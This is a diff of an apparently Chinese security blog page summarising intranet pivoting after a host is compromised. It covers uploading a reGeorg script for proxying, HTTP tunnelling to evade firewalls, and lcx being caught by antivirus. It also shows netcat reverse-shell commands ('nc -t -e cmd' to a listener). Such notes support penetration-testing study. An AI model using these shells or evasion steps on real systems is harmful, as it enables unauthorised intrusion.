@@ -144,7 +144,7 @@
             </div>
             <h2 class="post-title">内网穿透小结</h2>
             <div class="post-meta">
-                本文总共3032个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共3360个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -152,7 +152,12 @@
 <h2 id="2-基本知识概念梳理"><a href="#2-基本知识概念梳理" class="headerlink" title="2 基本知识概念梳理"></a>2 基本知识概念梳理</h2><h3 id="2-1-正向代理与反向代理"><a href="#2-1-正向代理与反向代理" class="headerlink" title="2.1 正向代理与反向代理"></a>2.1 正向代理与反向代理</h3><p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-17/58302339.jpg" alt=""></p>
 <p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-17/98033652.jpg" alt=""></p>
 <p>正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p>
-<h3 id="2-2-端口转发"><a href="#2-2-端口转发" class="headerlink" title="2.2 端口转发"></a>2.2 端口转发</h3><h3 id="2-2-内网常见环境"><a href="#2-2-内网常见环境" class="headerlink" title="2.2 内网常见环境"></a>2.2 内网常见环境</h3><h2 id="3-工具整理"><a href="#3-工具整理" class="headerlink" title="3 工具整理"></a>3 工具整理</h2><h3 id="3-1-Lcx转发"><a href="#3-1-Lcx转发" class="headerlink" title="3.1 Lcx转发"></a>3.1 Lcx转发</h3><h3 id="3-2-NC反弹"><a href="#3-2-NC反弹" class="headerlink" title="3.2 NC反弹"></a>3.2 NC反弹</h3><h4 id="3-2-1-正向连接"><a href="#3-2-1-正向连接" class="headerlink" title="3.2.1 正向连接"></a>3.2.1 正向连接</h4><h4 id="3-2-2-反向连接"><a href="#3-2-2-反向连接" class="headerlink" title="3.2.2 反向连接"></a>3.2.2 反向连接</h4><ol>
+<h3 id="2-2-端口转发"><a href="#2-2-端口转发" class="headerlink" title="2.2 端口转发"></a>2.2 端口转发</h3><h3 id="2-2-内网常见环境"><a href="#2-2-内网常见环境" class="headerlink" title="2.2 内网常见环境"></a>2.2 内网常见环境</h3><p>假设内网已经控制了一台主机。</p>
+<h4 id="2-2-1-已经控制的主机只开放了WEB服务"><a href="#2-2-1-已经控制的主机只开放了WEB服务" class="headerlink" title="2.2.1 已经控制的主机只开放了WEB服务"></a>2.2.1 已经控制的主机只开放了WEB服务</h4><p>当控制了web服务器，但是目标主机只开放了WEB服务。这时候可以用reGeorg作为代理，将reGeorg对应的脚本上传道WEB服务器，然后windows使用proxifire,Linux使用Proxychains作为代理，然后就可以探测内网了。</p>
+<h4 id="2-2-2-内网防火墙没有任何防护"><a href="#2-2-2-内网防火墙没有任何防护" class="headerlink" title="2.2.2 内网防火墙没有任何防护"></a>2.2.2 内网防火墙没有任何防护</h4><p>这时候可以选择的方案很多，如端口转发，代理，反弹。</p>
+<h4 id="2-2-3-内网防火墙只允许HTTP流量"><a href="#2-2-3-内网防火墙只允许HTTP流量" class="headerlink" title="2.2.3 内网防火墙只允许HTTP流量"></a>2.2.3 内网防火墙只允许HTTP流量</h4><p>这时候可以使用HTTP隧道，使用HTTP协议来包装各种信息。如果内网还检测内容，那么需要加密HTTP流量，可以使用bridge。或者ssh加密，可以防止数据内容被防火墙检测。</p>
+<h2 id="3-工具整理"><a href="#3-工具整理" class="headerlink" title="3 工具整理"></a>3 工具整理</h2><h3 id="3-1-Lcx转发"><a href="#3-1-Lcx转发" class="headerlink" title="3.1 Lcx转发"></a>3.1 Lcx转发</h3><p>lcx.exe容易被杀软检测。</p>
+<h3 id="3-2-NC反弹"><a href="#3-2-NC反弹" class="headerlink" title="3.2 NC反弹"></a>3.2 NC反弹</h3><h4 id="3-2-1-正向连接"><a href="#3-2-1-正向连接" class="headerlink" title="3.2.1 正向连接"></a>3.2.1 正向连接</h4><h4 id="3-2-2-反向连接"><a href="#3-2-2-反向连接" class="headerlink" title="3.2.2 反向连接"></a>3.2.2 反向连接</h4><ol>
 <li>在公网监听<br><code>nc -lp 5555</code></li>
 <li>在内网机器反弹<br><code>nc -t -e cmd 10.10.10.11 5555</code></li>
 </ol>
